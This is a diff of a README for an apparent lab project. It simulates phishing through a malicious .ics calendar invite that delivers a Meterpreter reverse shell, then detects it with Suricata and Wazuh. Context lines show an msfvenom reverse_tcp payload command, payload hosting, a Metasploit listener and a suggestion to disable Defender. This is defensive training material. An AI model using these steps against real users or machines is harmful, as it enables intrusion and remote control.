@@ -1,8 +1,8 @@
-# 🛡️Google-Calendar-Phishing-Attack-Suricata-and-Wazuh-Detection-Project
+# 🛡Google-Calendar-Phishing-Attack-Suricata-and-Wazuh-Detection-Project
 This project replicates a phishing attack using a malicious **.ics** calendar invite that delivers a reverse shell payload, and shows how to detect this attack using **Suricata** (an IDS) and **Wazuh** (a SIEM platform). This simulation is inspired by real-world techniques that abuse trusted calendar systems like Google Calendar for malware delivery and **command-and-control (C2)** communication.
 
 ---
-## 🧪 Objective
+##  Objective
 
 •	Simulate a realistic phishing attack using .ics calendar invites.
 
@@ -14,7 +14,7 @@ This project replicates a phishing attack using a malicious **.ics** calendar in
 
 ---
 
-## 📌 Lab Setup
+##  Lab Setup
 
 - Use **Briged Adapter** (or Internal Network) for both VMs:
   - Go to: *VirtualBox → Settings → Network*
@@ -31,18 +31,18 @@ Repeat the same for **Windows VM**.
 | **Network**   | Bridged Mode (same subnet for both VMs) | **Network**   |Allows both VMs to share network with host |
 | **IDS**   | Suricata | **On Ubuntu**   | Detects C2 traffic from payload |
 
-## 📸🌐Ubuntu Network Config
+## 📸Ubuntu Network Config
 ![Ubuntu_network](https://github.com/user-attachments/assets/d7b14041-237f-4890-b78e-6f38af0a5596)
 
-## 📸🌐Windows 10 Network Config
+## 📸Windows 10 Network Config
 ![windows 10 network](https://github.com/user-attachments/assets/d1c0d41c-61b2-4159-aa04-b044fee20eb6)
 
 ---
 
 ## ✅Phase 1: Setup and File Hosting on /Ubuntu VM
-### 🎯Goal
+### Goal
 Generate a reverse shell payload to be delivered via phishing.
-#### 🛠️1.1 Generate Payload:
+#### 1.1 Generate Payload:
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe > newpayload.exe
 ```
@@ -71,12 +71,12 @@ sudo systemctl start apache2
 Now payload is at:
 http://192.168.56.107/newpayload.exe
 
-## 🧠 Why?
+## Why?
 This step simulates malware hosted on an attacker-controlled server. It's a common initial access vector in phishing attacks.
 
 ---
 
-## Phase 2: 📆Create Malicious Calendar Invite (.ics)
+## Phase 2: Create Malicious Calendar Invite (.ics)
 The ICS file is a standard format used by calendar apps like Outlook, Thunderbird, and Google Calendar. In this attack, the .ics file is weaponized with a malicious URL in the DESCRIPTION and LOCATION fields.
 
 Create a file named **malicious_invite.ics**:
@@ -119,7 +119,7 @@ What you need before running:
 
     
 ### Python script to send .ics invite with friendly sender name
-#### 📁 Save the .py File
+#### Save the .py File
 ```bash
 nano send_calendar_invite.py
 ```
@@ -190,7 +190,7 @@ python3 send_calendar_invite.py
 
 ---
 
-## 🧪Phase 4: Execute the Attack
+## Phase 4: Execute the Attack
 ### 1. On the Windows VM (Victim):
 Steps:
 **1.Open Email Client:**
@@ -226,11 +226,11 @@ Alternatively, you can disable Windows Defender real-time protection temporarily
 ### 2.Setting Up a Reverse Shell Listener Using Metasploit:
 Once the phishing email has been sent and the victim downloads and executes the malicious payload (newpayload.exe), the attacker needs a way to receive the incoming reverse shell connection. This is done using the Metasploit Framework’s multi/handler module.
 
-## 🛠️ Purpose of This Step:
+## Purpose of This Step:
   - To prepare the attacker’s system (Ubuntu/Kali VM) to listen for an incoming connection from the victim.
   - To establish a Meterpreter session once the payload is executed on the Windows 10 machine.
 
-## ⚙️ Tools Used:
+## Tools Used:
 
 ## 1.Start Metasploit Listener:
 ```bash
@@ -275,9 +275,9 @@ Once executed, Metasploit will begin listening on the specified port (4444) and 
 
 ---
 
-## 🔍 Phase 5: Wazuh Host Monitoring
+##  Phase 5: Wazuh Host Monitoring
 
-🎯 Goal: Detect suspicious host behavior from the victim's machine.
+**Goal: Detect suspicious host behavior from the victim's machine.**
 Steps:
 - Install Wazuh Agent on Windows 10.
 - Set the manager IP to Ubuntu host.
@@ -289,7 +289,7 @@ Steps:
 
 ---
 
-## 🔍 Phase 6: Detecting the Attack with Suricata
+## Phase 6: Detecting the Attack with Suricata
 ### 1.Create Custom Suricata Rules
 1.Edit local.rules File:
 ```bash
@@ -355,14 +355,14 @@ This alert confirms that Suricata successfully identified a suspicious outbound 
 
 ________________________________________
 ✅ Final Outcome
-- 📨 Email with .ics invite sent to victim
-- 📅 Victim clicks calendar link
-- 🐚 Reverse shell gained on attacker
-- 📡 Wazuh logs system behavior
-- 🚨 Suricata detects suspicious traffic
+-  Email with .ics invite sent to victim
+-  Victim clicks calendar link
+-  Reverse shell gained on attacker
+-  Wazuh logs system behavior
+-  Suricata detects suspicious traffic
 
 ________________________________________
-📚 Credits
+ Credits
 Inspired by real-world phishing detection cases and lab simulation techniques.
 ________________________________________
 🔐 Disclaimer
